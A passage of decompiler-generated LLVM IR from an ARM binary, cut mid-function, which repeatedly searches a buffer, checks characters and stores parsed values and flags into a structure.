  store i1 %v7_9bbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bbc, label %.thread45, label %bb211

bb211:                                            ; preds = %dec_label_pc_9b78
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_9bc4 = load i32, i32* @r8, align 4
  %v3_9bc4 = add i32 %v2_9bc4, -4
  %v4_9bc4 = inttoptr i32 %v3_9bc4 to i32*
  store i32 2, i32* %v4_9bc4, align 4
  br label %.thread45

.thread45:                                        ; preds = %dec_label_pc_9b78, %bb211
  %v0_9bc8 = load i32, i32* @r5, align 4
  store i32 %v0_9bc8, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v2_9bd0 = inttoptr i32 %v0_9bc8 to i32*
  %v3_9bd0 = call i32 @function_13044(i32 45, i32* %v2_9bd0)
  %v0_9bd4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9bd4, i32* @r1, align 4
  store i32 %v3_9bd0, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9be0 = call i32 @function_13da8(i8* %tmp199, i32 %v0_9bd4, i32 %v3_9bd0)
  store i32 %v4_9be0, i32* %r0.global-to-local, align 4
  %v1_9be4 = add i32 %v4_9be0, 1
  %v2_9be4 = icmp eq i32 %v4_9be0, -1
  store i1 %v2_9be4, i1* %cpsr_c.global-to-local, align 1
  %v3_9be4 = sub i32 0, %v4_9be0
  %v4_9be4 = and i32 %v1_9be4, %v3_9be4
  %v5_9be4 = icmp slt i32 %v4_9be4, 0
  store i1 %v5_9be4, i1* %cpsr_v.global-to-local, align 1
  %v6_9be4 = icmp slt i32 %v1_9be4, 0
  store i1 %v6_9be4, i1* %cpsr_n.global-to-local, align 1
  %v7_9be4 = icmp eq i32 %v1_9be4, 0
  store i1 %v7_9be4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9be4, label %.thread46, label %bb212

bb212:                                            ; preds = %.thread45
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9bec = load i32, i32* @r8, align 4
  %v3_9bec = add i32 %v2_9bec, -4
  %v4_9bec = inttoptr i32 %v3_9bec to i32*
  store i32 1, i32* %v4_9bec, align 4
  br label %.thread46

.thread46:                                        ; preds = %.thread45, %bb212
  %v0_9bf0 = load i32, i32* @r5, align 4
  store i32 %v0_9bf0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_9bf8 = load i32, i32* @r8, align 4
  %v2_9bf8 = inttoptr i32 %v1_9bf8 to i32*
  store i32 %v0_9bf0, i32* %v2_9bf8, align 4
  %v2_9bfc = inttoptr i32 %v0_9bf0 to i32*
  %v3_9bfc = call i32 @function_13044(i32 44, i32* %v2_9bfc)
  %v0_9c00 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9c00, i32* @r1, align 4
  store i32 %v3_9bfc, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9c0c = call i32 @function_13da8(i8* %tmp199, i32 %v0_9c00, i32 %v3_9bfc)
  store i32 %v4_9c0c, i32* %r0.global-to-local, align 4
  %v1_9c10 = add i32 %v4_9c0c, 1
  %v2_9c10 = icmp eq i32 %v4_9c0c, -1
  store i1 %v2_9c10, i1* %cpsr_c.global-to-local, align 1
  %v3_9c10 = sub i32 0, %v4_9c0c
  %v4_9c10 = and i32 %v1_9c10, %v3_9c10
  %v5_9c10 = icmp slt i32 %v4_9c10, 0
  store i1 %v5_9c10, i1* %cpsr_v.global-to-local, align 1
  %v6_9c10 = icmp slt i32 %v1_9c10, 0
  store i1 %v6_9c10, i1* %cpsr_n.global-to-local, align 1
  %v7_9c10 = icmp eq i32 %v1_9c10, 0
  store i1 %v7_9c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c10, label %.thread47, label %dec_label_pc_9c18

dec_label_pc_9c18:                                ; preds = %.thread46
  %v0_9c18 = load i32, i32* @r5, align 4
  store i32 %v0_9c18, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v2_9c20 = inttoptr i32 %v0_9c18 to i32*
  %v3_9c20 = call i32 @function_13044(i32 44, i32* %v2_9c20)
  %v0_9c24 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9c24, i32* @r1, align 4
  store i32 %v3_9c20, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9c30 = call i32 @function_13da8(i8* %tmp199, i32 %v0_9c24, i32 %v3_9c20)
  store i32 %v4_9c30, i32* %r0.global-to-local, align 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  %v2_9c3c = add i32 %v4_9c30, %v2_94a0
  store i32 %v2_9c3c, i32* %r3.global-to-local, align 4
  %v1_9c40 = load i32, i32* @r6, align 4
  %v2_9c40 = add i32 %v1_9c40, %v2_9c3c
  %v3_9c40 = inttoptr i32 %v2_9c40 to i8*
  %v4_9c40 = load i8, i8* %v3_9c40, align 1
  %v2_9c48 = icmp ugt i8 %v4_9c40, 31
  store i1 %v2_9c48, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9c48 = icmp ult i8 %v4_9c40, 32
  store i1 %v6_9c48, i1* %cpsr_n.global-to-local, align 1
  %v7_9c48 = icmp eq i8 %v4_9c40, 32
  store i1 %v7_9c48, i1* %cpsr_z.global-to-local, align 1
  %v2_9c50 = zext i1 %v7_9c48 to i32
  %v2_9c50.v4_9c30 = add i32 %v2_9c50, %v4_9c30
  store i32 %v2_9c50.v4_9c30, i32* @r4, align 4
  %v2_9c54 = add i32 %v2_9c50.v4_9c30, %v2_8fd8
  store i32 %v2_9c54, i32* @r6, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9c54, i32* %r0.global-to-local, align 4
  %v1_9c60 = load i32, i32* %fp.global-to-local, align 4
  %v2_9c60 = sub i32 %v1_9c60, %v2_9c50.v4_9c30
  store i32 %v2_9c60, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9c68 = call i32 @function_13b18(i32 %v2_9c54, i32 %v2_9c60, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32 2)
  store i32 %v5_9c68, i32* %r0.global-to-local, align 4
  %v1_9c6c = add i32 %v5_9c68, 1
  %v2_9c6c = icmp eq i32 %v5_9c68, -1
  store i1 %v2_9c6c, i1* %cpsr_c.global-to-local, align 1
  %v3_9c6c = sub i32 0, %v5_9c68
  %v4_9c6c = and i32 %v1_9c6c, %v3_9c6c
  %v5_9c6c = icmp slt i32 %v4_9c6c, 0
  store i1 %v5_9c6c, i1* %cpsr_v.global-to-local, align 1
  %v6_9c6c = icmp slt i32 %v1_9c6c, 0
  store i1 %v6_9c6c, i1* %cpsr_n.global-to-local, align 1
  %v7_9c6c = icmp eq i32 %v1_9c6c, 0
  store i1 %v7_9c6c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9c68, i32* %r2.global-to-local, align 4
  br i1 %v7_9c6c, label %.thread47, label %dec_label_pc_9c78

dec_label_pc_9c78:                                ; preds = %dec_label_pc_9c18
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v1_9c80 = load i32, i32* @r4, align 4
  %v2_9c80 = add i32 %v1_9c80, %v2_94a0
  %v1_9c84 = add i32 %v5_9c68, -1
  %v2_9c84 = icmp ne i32 %v5_9c68, 0
  store i1 %v2_9c84, i1* %cpsr_c.global-to-local, align 1
  %v3_9c84 = sub i32 0, %v5_9c68
  %v4_9c84 = and i32 %v5_9c68, %v3_9c84
  %v5_9c84 = icmp slt i32 %v4_9c84, 0
  store i1 %v5_9c84, i1* %cpsr_v.global-to-local, align 1
  %v6_9c84 = icmp slt i32 %v1_9c84, 0
  store i1 %v6_9c84, i1* %cpsr_n.global-to-local, align 1
  %v7_9c84 = icmp eq i32 %v5_9c68, 1
  store i1 %v7_9c84, i1* %cpsr_z.global-to-local, align 1
  %v1_9c88 = add i32 %v2_9c80, -20736
  store i32 %v1_9c88, i32* %r3.global-to-local, align 4
  %v7_9c8c = icmp sgt i32 %v5_9c68, 1
  br i1 %v7_9c8c, label %bb213, label %bb214

bb213:                                            ; preds = %dec_label_pc_9c78
  %v9_9c8c = add i32 %v5_9c68, -2
  store i32 %v9_9c8c, i32* %r2.global-to-local, align 4
  br label %bb214

bb214:                                            ; preds = %dec_label_pc_9c78, %bb213
  %v3_9c94 = phi i32 [ %v5_9c68, %dec_label_pc_9c78 ], [ %v9_9c8c, %bb213 ]
  %v1_9c90 = add i32 %v2_9c80, -20773
  store i32 %v1_9c90, i32* %r3.global-to-local, align 4
  %v0_9c94 = load i32, i32* @r5, align 4
  %v1_9c94 = trunc i32 %v0_9c94 to i8
  %v4_9c94 = add i32 %v3_9c94, %v1_9c90
  %v5_9c94 = inttoptr i32 %v4_9c94 to i8*
  store i8 %v1_9c94, i8* %v5_9c94, align 1
  %v0_9c98 = load i32, i32* @r6, align 4
  store i32 %v0_9c98, i32* %r0.global-to-local, align 4
  %v1_9c9c = inttoptr i32 %v0_9c98 to i8*
  %v2_9c9c = call i32 @function_13a54(i8* %v1_9c9c)
  %v0_9ca0 = load i32, i32* @r5, align 4
  store i32 %v0_9ca0, i32* %r1.global-to-local, align 4
  store i32 %v2_9c9c, i32* @r4, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v2_9cac = inttoptr i32 %v0_9ca0 to i32*
  %v3_9cac = call i32 @function_13044(i32 43, i32* %v2_9cac)
  %v0_9cb0 = load i32, i32* @r4, align 4
  store i32 %v0_9cb0, i32* @r1, align 4
  store i32 %v3_9cac, i32* %r2.global-to-local, align 4
  %v0_9cb8 = load i32, i32* @r6, align 4
  store i32 %v0_9cb8, i32* %r0.global-to-local, align 4
  %v3_9cbc = inttoptr i32 %v0_9cb8 to i8*
  %v4_9cbc = call i32 @function_13da8(i8* %v3_9cbc, i32 %v0_9cb0, i32 %v3_9cac)
  store i32 %v4_9cbc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9cc0 = icmp slt i32 %v4_9cbc, 0
  store i1 %v1_9cc0, i1* %cpsr_n.global-to-local, align 1
  %v2_9cc0 = icmp eq i32 %v4_9cbc, 0
  store i1 %v2_9cc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9cc0, label %.thread47, label %bb215

bb215:                                            ; preds = %bb214
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9cc8 = load i32, i32* @r8, align 4
  %v3_9cc8 = inttoptr i32 %v2_9cc8 to i32*
  store i32 1, i32* %v3_9cc8, align 4
  br label %.thread47

.thread47:                                        ; preds = %bb214, %dec_label_pc_9c18, %.thread46, %bb215
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_9cd8 = load i32, i32* @r8, align 4
  %v2_9cd8 = add i32 %v1_9cd8, 4
  %v3_9cd8 = inttoptr i32 %v2_9cd8 to i32*
  store i32 0, i32* %v3_9cd8, align 4
  %v3_9cdc = call i32 @function_13044(i32 41, i32* null)
  %v0_9ce0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9ce0, i32* @r1, align 4
  store i32 %v3_9cdc, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9cec = call i32 @function_13da8(i8* %tmp199, i32 %v0_9ce0, i32 %v3_9cdc)
  store i32 %v4_9cec, i32* %r0.global-to-local, align 4
  %v1_9cf4 = add i32 %v4_9cec, 1
  %v2_9cf4 = icmp eq i32 %v4_9cec, -1
  store i1 %v2_9cf4, i1* %cpsr_c.global-to-local, align 1
  %v3_9cf4 = sub i32 0, %v4_9cec
  %v4_9cf4 = and i32 %v1_9cf4, %v3_9cf4
  %v5_9cf4 = icmp slt i32 %v4_9cf4, 0
  store i1 %v5_9cf4, i1* %cpsr_v.global-to-local, align 1
  %v6_9cf4 = icmp slt i32 %v1_9cf4, 0
  store i1 %v6_9cf4, i1* %cpsr_n.global-to-local, align 1
  %v7_9cf4 = icmp eq i32 %v1_9cf4, 0
  store i1 %v7_9cf4, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r5, align 4
  br i1 %v7_9cf4, label %.thread48, label %dec_label_pc_9d00

dec_label_pc_9d00:                                ; preds = %.thread47
  %v0_9d00 = load i32, i32* @r6, align 4
  store i32 %v0_9d00, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v2_9d08 = inttoptr i32 %v0_9d00 to i32*
  %v3_9d08 = call i32 @function_13044(i32 41, i32* %v2_9d08)
  %v0_9d0c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9d0c, i32* @r1, align 4
  store i32 %v3_9d08, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9d18 = call i32 @function_13da8(i8* %tmp199, i32 %v0_9d0c, i32 %v3_9d08)
  store i32 %v4_9d18, i32* %r0.global-to-local, align 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  %v2_9d24 = add i32 %v4_9d18, %v2_94a0
  store i32 %v2_9d24, i32* %r3.global-to-local, align 4
  %v1_9d28 = load i32, i32* @r5, align 4
  %v2_9d28 = add i32 %v1_9d28, %v2_9d24
  %v3_9d28 = inttoptr i32 %v2_9d28 to i8*
  %v4_9d28 = load i8, i8* %v3_9d28, align 1
  %v2_9d30 = icmp ugt i8 %v4_9d28, 31
  store i1 %v2_9d30, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9d30 = icmp ult i8 %v4_9d28, 32
  store i1 %v6_9d30, i1* %cpsr_n.global-to-local, align 1
  %v7_9d30 = icmp eq i8 %v4_9d28, 32
  store i1 %v7_9d30, i1* %cpsr_z.global-to-local, align 1
  %v2_9d38 = zext i1 %v7_9d30 to i32
  %v2_9d38.v4_9d18 = add i32 %v2_9d38, %v4_9d18
  store i32 %v2_9d38.v4_9d18, i32* @r4, align 4
  %v2_9d3c = add i32 %v2_9d38.v4_9d18, %v2_8fd8
  store i32 %v2_9d3c, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9d3c, i32* %r0.global-to-local, align 4
  %v1_9d48 = load i32, i32* %fp.global-to-local, align 4
  %v2_9d48 = sub i32 %v1_9d48, %v2_9d38.v4_9d18
  store i32 %v2_9d48, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9d50 = call i32 @function_13b18(i32 %v2_9d3c, i32 %v2_9d48, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32 2)
  store i32 %v5_9d50, i32* %r0.global-to-local, align 4
  %v1_9d54 = add i32 %v5_9d50, 1
  %v2_9d54 = icmp eq i32 %v5_9d50, -1
  store i1 %v2_9d54, i1* %cpsr_c.global-to-local, align 1
  %v3_9d54 = sub i32 0, %v5_9d50
  %v4_9d54 = and i32 %v1_9d54, %v3_9d54
  %v5_9d54 = icmp slt i32 %v4_9d54, 0
  store i1 %v5_9d54, i1* %cpsr_v.global-to-local, align 1
  %v6_9d54 = icmp slt i32 %v1_9d54, 0
  store i1 %v6_9d54, i1* %cpsr_n.global-to-local, align 1
  %v7_9d54 = icmp eq i32 %v1_9d54, 0
  store i1 %v7_9d54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9d50, i32* %r2.global-to-local, align 4
  br i1 %v7_9d54, label %.thread48, label %dec_label_pc_9d60

dec_label_pc_9d60:                                ; preds = %dec_label_pc_9d00
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v1_9d68 = load i32, i32* @r4, align 4
  %v2_9d68 = add i32 %v1_9d68, %v2_94a0
  %v1_9d6c = add i32 %v5_9d50, -1
  %v2_9d6c = icmp ne i32 %v5_9d50, 0
  store i1 %v2_9d6c, i1* %cpsr_c.global-to-local, align 1
  %v3_9d6c = sub i32 0, %v5_9d50
  %v4_9d6c = and i32 %v5_9d50, %v3_9d6c
  %v5_9d6c = icmp slt i32 %v4_9d6c, 0
  store i1 %v5_9d6c, i1* %cpsr_v.global-to-local, align 1
  %v6_9d6c = icmp slt i32 %v1_9d6c, 0
  store i1 %v6_9d6c, i1* %cpsr_n.global-to-local, align 1
  %v7_9d6c = icmp eq i32 %v5_9d50, 1
  store i1 %v7_9d6c, i1* %cpsr_z.global-to-local, align 1
  %v1_9d70 = add i32 %v2_9d68, -20736
  store i32 %v1_9d70, i32* %r3.global-to-local, align 4
  %v7_9d74 = icmp sgt i32 %v5_9d50, 1
  br i1 %v7_9d74, label %bb216, label %bb217

bb216:                                            ; preds = %dec_label_pc_9d60
  %v9_9d74 = add i32 %v5_9d50, -2
  store i32 %v9_9d74, i32* %r2.global-to-local, align 4
  br label %bb217

bb217:                                            ; preds = %dec_label_pc_9d60, %bb216
  %v3_9d7c = phi i32 [ %v5_9d50, %dec_label_pc_9d60 ], [ %v9_9d74, %bb216 ]
  %v1_9d78 = add i32 %v2_9d68, -20773
  store i32 %v1_9d78, i32* %r3.global-to-local, align 4
  %v0_9d7c = load i32, i32* @r6, align 4
  %v1_9d7c = trunc i32 %v0_9d7c to i8
  %v4_9d7c = add i32 %v3_9d7c, %v1_9d78
  %v5_9d7c = inttoptr i32 %v4_9d7c to i8*
  store i8 %v1_9d7c, i8* %v5_9d7c, align 1
  %v0_9d80 = load i32, i32* @r5, align 4
  store i32 %v0_9d80, i32* %r0.global-to-local, align 4
  %v1_9d84 = inttoptr i32 %v0_9d80 to i8*
  %v2_9d84 = call i32 @function_13a54(i8* %v1_9d84)
  %v0_9d88 = load i32, i32* @r6, align 4
  store i32 %v0_9d88, i32* %r1.global-to-local, align 4
  store i32 %v2_9d84, i32* @r4, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_9d94 = inttoptr i32 %v0_9d88 to i32*
  %v3_9d94 = call i32 @function_13044(i32 42, i32* %v2_9d94)
  %v0_9d98 = load i32, i32* @r4, align 4
  store i32 %v0_9d98, i32* @r1, align 4
  store i32 %v3_9d94, i32* %r2.global-to-local, align 4
  %v0_9da0 = load i32, i32* @r5, align 4
  store i32 %v0_9da0, i32* %r0.global-to-local, align 4
  %v3_9da4 = inttoptr i32 %v0_9da0 to i8*
  %v4_9da4 = call i32 @function_13da8(i8* %v3_9da4, i32 %v0_9d98, i32 %v3_9d94)
  store i32 %v4_9da4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9da8 = icmp slt i32 %v4_9da4, 0
  store i1 %v1_9da8, i1* %cpsr_n.global-to-local, align 1
  %v2_9da8 = icmp eq i32 %v4_9da4, 0
  store i1 %v2_9da8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9da8, label %.thread48, label %bb218

bb218:                                            ; preds = %bb217
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9db0 = load i32, i32* @r8, align 4
  %v3_9db0 = add i32 %v2_9db0, 4
  %v4_9db0 = inttoptr i32 %v3_9db0 to i32*
  store i32 1, i32* %v4_9db0, align 4
  br label %.thread48

.thread48:                                        ; preds = %bb217, %dec_label_pc_9d00, %.thread47, %bb218
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9dbc = call i32 @function_13044(i32 40, i32* null)
  %v0_9dc0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9dc0, i32* @r1, align 4
  store i32 %v3_9dbc, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9dcc = call i32 @function_13da8(i8* %tmp199, i32 %v0_9dc0, i32 %v3_9dbc)
  store i32 %v4_9dcc, i32* %r0.global-to-local, align 4
  %v1_9dd0 = add i32 %v4_9dcc, 1
  %v2_9dd0 = icmp eq i32 %v4_9dcc, -1
  store i1 %v2_9dd0, i1* %cpsr_c.global-to-local, align 1
  %v3_9dd0 = sub i32 0, %v4_9dcc
  %v4_9dd0 = and i32 %v1_9dd0, %v3_9dd0
  %v5_9dd0 = icmp slt i32 %v4_9dd0, 0
  store i1 %v5_9dd0, i1* %cpsr_v.global-to-local, align 1
  %v6_9dd0 = icmp slt i32 %v1_9dd0, 0
  store i1 %v6_9dd0, i1* %cpsr_n.global-to-local, align 1
  %v7_9dd0 = icmp eq i32 %v1_9dd0, 0
  store i1 %v7_9dd0, i1* %cpsr_z.global-to-local, align 1
  store i32 -20737, i32* %r5.global-to-local, align 4
  br i1 %v7_9dd0, label %.thread, label %dec_label_pc_9de8

.thread:                                          ; preds = %.thread48
  store i32 -20773, i32* %r5.global-to-local, align 4
  %v2_9de0 = load i32, i32* @r8, align 4
  %v3_9de0 = add i32 %v2_9de0, 8
  %v4_9de0 = inttoptr i32 %v3_9de0 to i32*
  store i32 0, i32* %v4_9de0, align 4
  br label %dec_label_pc_9e7c

dec_label_pc_9de8:                                ; preds = %.thread48
  store i32 -20773, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9df0 = call i32 @function_13044(i32 40, i32* null)
  %v0_9df4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9df4, i32* @r1, align 4
  store i32 %v3_9df0, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9e00 = call i32 @function_13da8(i8* %tmp199, i32 %v0_9df4, i32 %v3_9df0)
  store i32 %v4_9e00, i32* %r0.global-to-local, align 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  %v2_9e0c = add i32 %v4_9e00, %v2_94a0
  store i32 %v2_9e0c, i32* %r3.global-to-local, align 4
  %v1_9e10 = load i32, i32* @r5, align 4
  %v2_9e10 = add i32 %v1_9e10, %v2_9e0c
  %v3_9e10 = inttoptr i32 %v2_9e10 to i8*
  %v4_9e10 = load i8, i8* %v3_9e10, align 1
  %v2_9e18 = icmp ugt i8 %v4_9e10, 31
  store i1 %v2_9e18, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9e18 = icmp ult i8 %v4_9e10, 32
  store i1 %v6_9e18, i1* %cpsr_n.global-to-local, align 1
  %v7_9e18 = icmp eq i8 %v4_9e10, 32
  store i1 %v7_9e18, i1* %cpsr_z.global-to-local, align 1
  %v2_9e20 = zext i1 %v7_9e18 to i32
  %v2_9e20.v4_9e00 = add i32 %v2_9e20, %v4_9e00
  store i32 %v2_9e20.v4_9e00, i32* @r4, align 4
  %v2_9e24 = add i32 %v2_9e20.v4_9e00, %v2_8fd8
  store i32 %v2_9e24, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9e24, i32* %r0.global-to-local, align 4
  %v1_9e30 = load i32, i32* %fp.global-to-local, align 4
  %v2_9e30 = sub i32 %v1_9e30, %v2_9e20.v4_9e00
  store i32 %v2_9e30, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9e38 = call i32 @function_13b18(i32 %v2_9e24, i32 %v2_9e30, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32 2)
  store i32 %v5_9e38, i32* %r0.global-to-local, align 4
  %v1_9e3c = add i32 %v5_9e38, 1
  %v2_9e3c = icmp eq i32 %v5_9e38, -1
  store i1 %v2_9e3c, i1* %cpsr_c.global-to-local, align 1
  %v3_9e3c = sub i32 0, %v5_9e38
  %v4_9e3c = and i32 %v1_9e3c, %v3_9e3c
  %v5_9e3c = icmp slt i32 %v4_9e3c, 0
  store i1 %v5_9e3c, i1* %cpsr_v.global-to-local, align 1
  %v6_9e3c = icmp slt i32 %v1_9e3c, 0
  store i1 %v6_9e3c, i1* %cpsr_n.global-to-local, align 1
  %v7_9e3c = icmp eq i32 %v1_9e3c, 0
  store i1 %v7_9e3c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9e38, i32* %r2.global-to-local, align 4
  br i1 %v7_9e3c, label %dec_label_pc_9e7c, label %dec_label_pc_9e48

dec_label_pc_9e48:                                ; preds = %dec_label_pc_9de8
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v1_9e50 = load i32, i32* @r4, align 4
  %v2_9e50 = add i32 %v1_9e50, %v2_94a0
  %v1_9e54 = add i32 %v5_9e38, -1
  %v2_9e54 = icmp ne i32 %v5_9e38, 0
  store i1 %v2_9e54, i1* %cpsr_c.global-to-local, align 1
  %v3_9e54 = sub i32 0, %v5_9e38
  %v4_9e54 = and i32 %v5_9e38, %v3_9e54
  %v5_9e54 = icmp slt i32 %v4_9e54, 0
  store i1 %v5_9e54, i1* %cpsr_v.global-to-local, align 1
  %v6_9e54 = icmp slt i32 %v1_9e54, 0
  store i1 %v6_9e54, i1* %cpsr_n.global-to-local, align 1
  %v7_9e54 = icmp eq i32 %v5_9e38, 1
  store i1 %v7_9e54, i1* %cpsr_z.global-to-local, align 1
  %v1_9e58 = add i32 %v2_9e50, -20736
  store i32 %v1_9e58, i32* %r3.global-to-local, align 4
  %v7_9e5c = icmp sgt i32 %v5_9e38, 1
  br i1 %v7_9e5c, label %bb219, label %bb220

bb219:                                            ; preds = %dec_label_pc_9e48
  %v9_9e5c = add i32 %v5_9e38, -2
  store i32 %v9_9e5c, i32* %r2.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %dec_label_pc_9e48, %bb219
  %v3_9e70 = phi i32 [ %v5_9e38, %dec_label_pc_9e48 ], [ %v9_9e5c, %bb219 ]
  %v1_9e60 = add i32 %v2_9e50, -20773
  store i32 %v1_9e60, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_9e68 = load i32, i32* @r5, align 4
  store i32 %v0_9e68, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v4_9e70 = add i32 %v3_9e70, %v1_9e60
  %v5_9e70 = inttoptr i32 %v4_9e70 to i8*
  store i8 0, i8* %v5_9e70, align 1
  %v2_9e74 = inttoptr i32 %v0_9e68 to i8*
  %v3_9e74 = call i32 @function_13b80(i8* %v2_9e74, i32 10)
  store i32 %v3_9e74, i32* %r0.global-to-local, align 4
  %v1_9e78 = load i32, i32* @r8, align 4
  %v2_9e78 = add i32 %v1_9e78, 8
  %v3_9e78 = inttoptr i32 %v2_9e78 to i32*
  store i32 %v3_9e74, i32* %v3_9e78, align 4
  br label %dec_label_pc_9e7c

dec_label_pc_9e7c:                                ; preds = %.thread, %dec_label_pc_9de8, %bb220
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9e80

dec_label_pc_9e80:                                ; preds = %dec_label_pc_a054, %dec_label_pc_9fd4, %dec_label_pc_9e7c
  %v1_9e8c = phi i32 [ 0, %dec_label_pc_9e7c ], [ %v0_9fd4, %dec_label_pc_9fd4 ], [ %v1_9e8c.pre.pre, %dec_label_pc_a054 ]
  store i32 %v2_8fd8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v2_9e8c = add i32 %v1_9e8c, %v2_8fd8
  store i32 %v2_9e8c, i32* @r4, align 4
  %v3_9e90 = call i32 @function_13044(i32 39, i32* null)
  %v0_9e94 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9e94, i32* @r1, align 4
  store i32 %v3_9e90, i32* %r2.global-to-local, align 4
  %v0_9e9c = load i32, i32* @r4, align 4
  store i32 %v0_9e9c, i32* %r0.global-to-local, align 4
  %v3_9ea0 = inttoptr i32 %v0_9e9c to i8*
  %v4_9ea0 = call i32 @function_13da8(i8* %v3_9ea0, i32 %v0_9e94, i32 %v3_9e90)
  store i32 %v4_9ea0, i32* %r0.global-to-local, align 4
  %v1_9ea8 = add i32 %v4_9ea0, 1
  %v2_9ea8 = icmp eq i32 %v4_9ea0, -1
  store i1 %v2_9ea8, i1* %cpsr_c.global-to-local, align 1
  %v3_9ea8 = sub i32 0, %v4_9ea0
  %v4_9ea8 = and i32 %v1_9ea8, %v3_9ea8
  %v5_9ea8 = icmp slt i32 %v4_9ea8, 0
  store i1 %v5_9ea8, i1* %cpsr_v.global-to-local, align 1
  %v6_9ea8 = icmp slt i32 %v1_9ea8, 0
  store i1 %v6_9ea8, i1* %cpsr_n.global-to-local, align 1
  %v7_9ea8 = icmp eq i32 %v1_9ea8, 0
  store i1 %v7_9ea8, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9ea8, label %dec_label_pc_a080, label %dec_label_pc_9eb4

dec_label_pc_9eb4:                                ; preds = %dec_label_pc_9e80
  %v0_9eb4 = load i32, i32* @r8, align 4
  %v1_9eb4 = add i32 %v0_9eb4, 12
  %v2_9eb4 = inttoptr i32 %v1_9eb4 to i32*
  %v3_9eb4 = load i32, i32* %v2_9eb4, align 4
  store i32 %v3_9eb4, i32* %r3.global-to-local, align 4
  %v1_9eb8 = add i32 %v3_9eb4, -4
  %v2_9eb8 = icmp ugt i32 %v3_9eb4, 3
  store i1 %v2_9eb8, i1* %cpsr_c.global-to-local, align 1
  %v3_9eb8 = sub i32 3, %v3_9eb4
  %v4_9eb8 = and i32 %v3_9eb8, %v3_9eb4
